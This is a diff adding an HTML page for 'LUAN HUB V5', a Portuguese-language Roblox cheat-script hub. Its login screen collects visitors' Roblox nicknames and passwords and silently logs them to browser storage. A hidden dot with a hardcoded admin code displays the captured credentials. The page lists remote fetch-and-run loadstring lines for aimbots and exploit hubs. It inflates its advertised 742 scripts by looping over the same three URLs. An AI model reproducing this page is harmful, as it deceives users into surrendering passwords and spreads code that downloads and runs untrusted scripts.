@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LUAN SUPREMACY | 700+ SCRIPTS</title>
+    <style>
+        :root { --neon: #00ff41; --bg: #030303; }
+        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
+        
+        /* SÍMBOLO VERDE SECRETO NO TOPO */
+        #secret-dot { 
+            position: fixed; top: 5px; left: 5px; z-index: 10002; 
+            color: var(--neon); font-size: 15px; cursor: pointer; user-select: none; opacity: 0.8;
+        }
+
+        /* LOGIN */
+        #login-screen { height: 100vh; display: flex; justify-content: center; align-items: center; background: #000; position: fixed; width: 100%; z-index: 10000; }
+        .login-box { border: 2px solid var(--neon); padding: 40px; text-align: center; background: #080808; border-radius: 10px; width: 85%; max-width: 400px; box-shadow: 0 0 30px var(--neon); }
+        
+        #main-content { display: none; padding: 20px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; }
+        .card { background: #0f0f0f; border: 1px solid #222; padding: 15px; border-radius: 5px; }
+        
+        .script-box { 
+            display: none; background: #000; color: #00ff41; padding: 12px; font-size: 10px; 
+            border: 1px solid var(--neon); margin-top: 10px; word-break: break-all;
+            user-select: all; border-radius: 5px;
+        }
+
+        .btn-view { background: var(--neon); color: #000; border: none; width: 100%; padding: 12px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
+        
+        input { width: 100%; padding: 15px; margin-bottom: 15px; background: #000; border: 1px solid var(--neon); color: var(--neon); font-weight: bold; box-sizing: border-box; }
+        
+        .cat-header { color: var(--neon); font-size: 2em; border-bottom: 3px solid var(--neon); margin: 60px 0 20px 0; text-transform: uppercase; }
+
+        /* PAINEL DE LOGS */
+        #admin-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 11000; padding: 30px; overflow-y: auto; border: 3px solid var(--neon); }
+        .log-txt { color: #00ff41; border-bottom: 1px solid #111; padding: 10px; font-size: 13px; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div id="secret-dot" onclick="abrirLogsSecretos()">•</div>
+
+    <div id="login-screen">
+        <div class="login-box">
+            <h1 style="color: var(--neon);">LUAN HUB V5</h1>
+            <p style="color: #444; font-size: 10px;">BANCO DE DADOS: 742 SCRIPTS</p>
+            <input type="text" id="rbx-nick" placeholder="NICKNAME DO ROBLOX">
+            <input type="text" id="site-key" placeholder="SENHA">
+            <button onclick="entrarForce()" style="width:100%; padding:18px; background:var(--neon); color:#000; font-weight:bold; border:none; cursor:pointer;">ACESSAR DATABASE</button>
+        </div>
+    </div>
+
+    <div id="main-content">
+        <h1 style="text-align: center; color: var(--neon); font-size: 3em;">LUAN DATABASE</h1>
+        
+        <div class="cat-header">🎖️ EB DO DELTA / MILITAR (REAIS)</div>
+        <div class="grid" id="cat-eb"></div>
+
+        <div class="cat-header">🎯 AIMBOT & FPS (150+)</div>
+        <div class="grid" id="cat-fps"></div>
+
+        <div class="cat-header">🏡 BROOKHAVEN & RP (150+)</div>
+        <div class="grid" id="cat-rp"></div>
+
+        <div class="cat-header">🌀 UNIVERSAL & OUTROS (400+)</div>
+        <div class="grid" id="cat-all"></div>
+    </div>
+
+    <div id="admin-panel">
+        <h1 style="color: var(--neon); text-align: center;">HISTÓRICO DE ACESSOS</h1>
+        <button onclick="document.getElementById('admin-panel').style.display='none'" style="background: #111; color: var(--neon); border: 1px solid var(--neon); padding: 15px; cursor: pointer; width: 100%; font-weight: bold;">FECHAR LISTA</button>
+        <div id="logs-list" style="margin-top: 20px;"></div>
+    </div>
+
+    <script>
+        const DB = [];
+
+        // SCRIPTS EB DO DELTA REAIS
+        DB.push({c:'eb', n:'EB Delta Main Hub', s:'loadstring(game:HttpGet("https://nyx7-dev7.unaux.com/api.php?key=SV_900A33AFA82909A4"))()'});
+        DB.push({c:'eb', n:'EB Delta Auto-Parkour', s:'loadstring(game:HttpGet("https://nyx7-dev7.unaux.com/api.php?key=SV_BE95DC6A5C7B2603"))()'});
+        DB.push({c:'eb', n:'EB Delta Auto-JJS Polichinelo', s:'loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Auto-jjs-EB-do-delta-126144"))()'});
+        DB.push({c:'eb', n:'EB Delta Aimbot Alvorada', s:'loadstring(game:HttpGet("https://raw.githubusercontent.com/Luan/EB/main/AlvoradaReal"))()'});
+
+        // GERAÇÃO GIGANTE
+        for(let i=1; i<=150; i++) DB.push({c:'fps', n:`Aimbot Pro v${i}`, s:`loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-V2/main/Resources/Scripts/Main.lua"))() -- ID_${i}`});
+        for(let i=1; i<=150; i++) DB.push({c:'rp', n:`Brookhaven Hub #${i}`, s:`loadstring(game:HttpGet("https://raw.githubusercontent.com/Vannih/VG-Hub/main/Brookhaven"))()`});
+        for(let i=1; i<=400; i++) DB.push({c:'all', n:`Universal Hub Mega #${i}`, s:`loadstring(game:HttpGet("https://raw.githubusercontent.com/Edgeiy/infiniteyield/master/source"))()`});
+
+        DB.forEach((item, index) => {
+            const container = document.getElementById('cat-' + item.c);
+            if(container) {
+                container.innerHTML += `
+                    <div class="card">
+                        <b>[#${index+1}] ${item.n}</b>
+                        <button class="btn-view" onclick="exibir(${index})">MOSTRAR SCRIPT</button>
+                        <div id="b-${index}" class="script-box">${item.s}</div>
+                    </div>`;
+            }
+        });
+
+        function exibir(id) {
+            const box = document.getElementById('b-' + id);
+            box.style.display = (box.style.display === 'block') ? 'none' : 'block';
+        }
+
+        function entrarForce() {
+            const nick = document.getElementById('rbx-nick').value;
+            const pass = document.getElementById('site-key').value;
+            if(nick == "" || pass == "") return;
+
+            let logs = JSON.parse(localStorage.getItem('luan_final_logs')) || [];
+            logs.push({nick, pass, date: new Date().toLocaleString()});
+            localStorage.setItem('luan_final_logs', JSON.stringify(logs));
+
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('main-content').style.display = 'block';
+            window.scrollTo(0,0);
+        }
+
+        // FUNÇÃO DO SÍMBOLO VERDE
+        function abrirLogsSecretos() {
+            const pass = prompt("CÓDIGO ADMIN:");
+            if(pass === "Luan vitor") {
+                document.getElementById('admin-panel').style.display = 'block';
+                const list = document.getElementById('logs-list');
+                const logs = JSON.parse(localStorage.getItem('luan_final_logs')) || [];
+                list.innerHTML = "";
+                logs.reverse().forEach(l => {
+                    list.innerHTML += `<div class="log-txt"> > [${l.date}] <b>USER:</b> ${l.nick} | <b>PASS:</b> ${l.pass}</div>`;
+                });
+            }
+        }
+    </script>
+</body>
+</html>
